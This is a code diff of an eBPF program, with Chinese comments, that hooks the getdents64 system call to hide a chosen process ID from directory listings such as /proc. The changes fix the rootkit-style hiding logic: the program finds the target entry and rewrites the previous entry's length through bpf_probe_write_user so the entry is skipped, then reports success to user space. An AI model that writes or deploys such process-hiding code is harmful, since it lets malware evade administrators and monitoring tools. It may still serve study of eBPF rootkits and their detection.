@@ -1,9 +1,12 @@
+// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
+/* Copyright (c) 2020 Facebook */
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
 #include "common.h"
 
-char LICENSE[] SEC("license") = "GPL";
+char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
 //全局变量区
 volatile int target_ppid = 0;
@@ -12,14 +15,14 @@ volatile int target_ppid = 0;
 #define MAX_PID_LEN 10
 //只
 const volatile int pid_to_hide_len = 0;
-const volatile char pid_to_hide[MAX_PID_LEN] = {0};
+const volatile char pid_to_hide[MAX_PID_LEN];
 
 // map映射表 存储dents 缓冲区的地址
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, u32);
-    __type(value, u64);
+    __type(key, u64);
+    __type(value, long unsigned int);
 } map_buffs SEC(".maps");
 
 // map映射表，key是pid_tgid,value是已读取的字节位置
@@ -35,25 +38,25 @@ struct {
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, u32);
-    __type(value, u32);
+    __type(key, u64);
+    __type(value, int);
 } map_bytes_read SEC(".maps");
 
 // map映射表，存储程序的尾调用的索引
 struct {
     __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
     __uint(max_entries, 5);
-    __type(key, u32);
-    __type(value, u32);
-}map_prog_array SEC(".maps");
+    __type(key, __u32);
+    __type(value, __u32);
+} map_prog_array SEC(".maps");
 
 
 //map映射表，存储实际的地址
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, u32);
-    __type(value, u64);
+    __type(key, u64);
+    __type(value, long unsigned int);
 } map_to_patch SEC(".maps");
 
 // 环形缓冲区，用于想用户空间发送数据
@@ -64,7 +67,7 @@ struct {
 
 //定义tracepoint处理函数
 // 函数原型：int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-SEC("tracepoint/syscalls/sys_enter_getdents64")
+SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     if(target_ppid != 0) {
@@ -91,7 +94,7 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
 }
 
 // 处理getdents64系统调用的退出事件
-SEC("tracepoint/syscalls/sys_exit_getdents64")
+SEC("tp/syscalls/sys_exit_getdents64")
 int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int total_bytes_read = ctx->ret;
@@ -107,8 +110,6 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
         return 0;
     }
 
-    // 迭代 200 个块中的文件列表，并查看其中是否有一个以我们的 pid 为名称的文件夹。
-    // 如果我们找到它，则使用“bpf_tail_call”跳转到 handle_getdents_patch 进行实际修补
     long unsigned int buff_addr = *pbuff_addr;
     struct linux_dirent64 *dirp = 0;
     int pid = pid_tgid >> 32;
@@ -116,16 +117,17 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
     char filename[MAX_PID_LEN];
     
     unsigned int bpos = 0;
-    //获取当前读取的位置    
+    //获取当前读取的位置
+    //第一次调用：pBPOS为NULL，pBPOS值为初始值0，从头开始读取
+    //后续尾调用：pBPOS不为NULL，从上次保存的位置pBPOS继续读取
+    //200次循环限制：如果一次处理不完，保存进度到map中，通过尾调用继续处理
     unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
-    if(!pBPOS) {
-        bpf_printk("error:pBPOS is NULL\n");
-        return 0;
+    if(pBPOS != NULL) {
+        bpos = *pBPOS;
     }
 
-    bpos = *pBPOS;
-
     //循环200次处理目录项，读取数据
+    struct linux_dirent64 *dirp_previous = NULL;  // 记录前一个目录项
     for (int i = 0; i < 200; i++) {
         //如果读取位置大于等于总字节数，则表示已经读完所有数据，则退出循环
         if(bpos >= total_bytes_read) {
@@ -135,8 +137,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
         // 读取数据
         dirp = (struct linux_dirent64 *)(buff_addr + bpos);
         bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
-        //TODO:MAX_FILENAME_LEN need passed from userspace,not finished
-        bpf_probe_read_user_str(filename, MAX_PID_LEN, &dirp->d_name);
+        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
 
         // 检查是否需要隐藏
         int j = 0;
@@ -145,15 +146,21 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
                 break;
             }
         }
-        
+
         if(j == pid_to_hide_len){
-            //发现了文件夹,跳转到handle_getdents_patch函数，然后我们可以移除它!
-            bpf_map_delete_elem(&map_buffs, &pid_tgid);
+            // 发现了文件夹,跳转到handle_getdents_patch函数
+            // 保存前一个目录项的地址（用于patch时扩展其长度来覆盖当前目标目录项）
+            if(dirp_previous != NULL) {
+                bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp_previous, BPF_ANY);
+            }
             bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
+            bpf_map_delete_elem(&map_buffs, &pid_tgid);
             bpf_tail_call(ctx, &map_prog_array, PROG_02);
+            // bpf_tail_call 如果失败会继续执行，所以必须 return
+            return 0;
         }
-        //将目录项缓冲区地址添加到map_to_patch映射标中
-        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
+        // 保存当前目录项作为下一次循环的"前一个目录项"
+        dirp_previous = dirp;
         bpos += d_reclen;
     }
 
@@ -164,6 +171,8 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
         //尾调用自身，继续处理
         //PROG_01为handle_getdents_exit，为当前函数
         bpf_tail_call(ctx, &map_prog_array, PROG_01);
+        // bpf_tail_call 如果失败会继续执行，所以必须 return
+        return 0;
     }
 
     //所有数据都读取完成，从map中删除对应的记录
@@ -172,7 +181,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
     return 0;
 }
 
-SEC("tracepoint/syscalls/sys_exit_getdents64")
+SEC("tp/syscalls/sys_exit_getdents64")
 int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     //确保已检查并找到待隐藏的pid文件夹时，才进行patch
@@ -196,37 +205,30 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
     //4. 读取要隐藏的目录项的长度
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
-    // ===== 调试信息打印 =====
-    //打印前一个目录下的文件名
+    // Debug print
     char filename[MAX_PID_LEN];
-    bpf_probe_read_user_str(filename, MAX_PID_LEN, &dirp_previous->d_name);
-    filename[MAX_PID_LEN - 1] = '\0';
-    bpf_printk("file previous: %s\n", filename);
-    
-    //打印要隐藏的目录项的文件名
-    bpf_probe_read_user_str(filename, pid_to_hide_len, &dirp->d_name);
-    filename[pid_to_hide_len - 1] = '\0';
-    bpf_printk("file next one: %s\n", filename);
+    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
+    filename[pid_to_hide_len-1] = 0x00;
+    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
+    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
+    filename[pid_to_hide_len-1] = 0x00;
+    bpf_printk("[PID_HIDE] filename next one %s\n", filename);
 
-    // ===== 执行隐藏操作 =====
-    // 核心隐藏逻辑：修改前一个目录项的长度，使其跨过要隐藏的目录项
-    // 新长度 = 前一个目录项上都 + 当前目录项长度
+    // Attempt to overwrite
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
-    // 将新长度写到前一个目录项中
     long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
 
-    // ===== 发送事件通知 =====
-    // 通过环形缓冲区向用户空间发送操作结果
-    struct event* e;
-    e = bpf_ringbuf_reserve(&rb, sizeof(*e),  0);
-    if(e){
-        e->success = (ret == 0); //内容篡改操作是否成功
-        e->pid = (pid_tgid >> 32);//pid值
-        bpf_get_current_comm(&e->comm, sizeof(e->comm));//获取进程名称
-        bpf_ringbuf_submit(e, 0);//提交事件
+    // Send an event
+    struct event *e;
+    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
+    if (e) {
+        e->success = (ret == 0);
+        e->pid = (pid_tgid >> 32);
+        bpf_get_current_comm(&e->comm, sizeof(e->comm));
+        bpf_ringbuf_submit(e, 0);
     }
 
-    //从map中删除已处理的缓冲区地址
+
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
 
     return 0;
